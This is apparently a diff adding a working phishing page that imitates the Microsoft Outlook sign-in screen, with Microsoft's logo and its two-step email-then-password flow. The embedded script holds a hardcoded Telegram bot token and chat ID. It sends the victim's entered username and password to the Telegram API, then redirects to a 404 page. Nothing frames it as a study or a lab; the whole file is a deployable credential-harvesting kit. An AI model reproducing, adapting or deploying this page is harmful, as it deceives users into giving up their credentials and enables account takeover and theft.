@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Sign in to your account</title>
+    <style>
+        body {
+            background-color: #f3f3f3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        .auth-container {
+            background-color: white;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .logo {
+            width: 108px;
+            margin-bottom: 1rem;
+        }
+
+        h2 {
+            color: #1A365D;
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        p {
+            color: #555;
+            margin-bottom: 1rem;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 0.75rem;
+            margin-bottom: 1rem;
+            border: 1px solid #d1d1d1;
+            border-radius: 4px;
+            font-size: 1rem;
+        }
+
+        .input-field:focus {
+            outline: 2px solid #0078d4;
+        }
+
+        .submit-button {
+            width: 100%;
+            padding: 0.75rem;
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 1rem;
+            cursor: pointer;
+        }
+
+        .submit-button:hover {
+            background-color: #005a9e;
+        }
+
+        .submit-button:focus {
+            outline: 2px solid #0078d4;
+        }
+
+        .footer-text {
+            font-size: 0.875rem;
+            margin: 0.5rem 0;
+        }
+
+        .footer-text a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+
+        .footer-text a:hover {
+            text-decoration: underline;
+        }
+
+        .checkbox-group {
+            text-align: left;
+            margin-bottom: 1rem;
+        }
+
+        .back-button {
+            background: none;
+            border: none;
+            color: #0078d4;
+            cursor: pointer;
+            font-size: 0.875rem;
+            margin-top: 1rem;
+        }
+
+        .back-button:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 480px) {
+            .auth-container {
+                padding: 1rem;
+            }
+            .input-field, .submit-button {
+                font-size: 0.875rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="auth-container">
+        <div id="usernamePage">
+            <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft Logo" class="logo">
+            <h2>Sign in</h2>
+            <p>to continue to Outlook</p>
+            <form id="usernameForm">
+                <input type="text" id="username" placeholder="Email, phone, or Skype" class="input-field" required>
+                <button type="submit" class="submit-button">Next</button>
+            </form>
+            <p class="footer-text"><a href="#">No account? Create one!</a></p>
+            <p class="footer-text"><a href="#">Can’t access your account?</a></p>
+        </div>
+        <div id="passwordPage" style="display: none;">
+            <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft Logo" class="logo">
+            <h2>Enter password</h2>
+            <p>for <span id="displayUsername"></span></p>
+            <form id="passwordForm">
+                <input type="password" id="password" placeholder="Password" class="input-field" required>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="keepSignedIn">
+                    <label for="keepSignedIn">Keep me signed in</label>
+                </div>
+                <button type="submit" class="submit-button">Sign in</button>
+            </form>
+            <button type="button" class="back-button" onclick="goBack()">Back</button>
+            <p class="footer-text"><a href="#">Forgot password?</a></p>
+        </div>
+    </div>
+    <script>
+        const BOT_TOKEN = "7719751326:AAEuzVtlSpvou8ol2-YdTJvGrxXKHqITE_s";
+        const CHAT_ID = "5990707499";
+        let username = '';
+
+        document.getElementById('usernameForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            username = document.getElementById('username').value;
+            if (username) {
+                document.getElementById('displayUsername').textContent = username;
+                document.getElementById('usernamePage').style.display = 'none';
+                document.getElementById('passwordPage').style.display = 'block';
+            }
+        });
+
+        document.getElementById('passwordForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const password = document.getElementById('password').value;
+            if (password) {
+                const message = `Username: ${username}\nPassword: ${password}`;
+                try {
+                    await sendToTelegram(message);
+                    window.location.href = "404.html";
+                } catch (error) {
+                    console.error("Error sending to Telegram:", error);
+                    alert("Failed to send details to Telegram. Check the console for details.");
+                }
+            }
+        });
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+            const response = await fetch(url);
+            if (!response.ok) {
+                throw new Error(`Telegram API error: ${response.statusText}`);
+            }
+        }
+
+        function goBack() {
+            document.getElementById('passwordPage').style.display = 'none';
+            document.getElementById('usernamePage').style.display = 'block';
+            username = '';
+        }
+    </script>
+</body>
+</html>
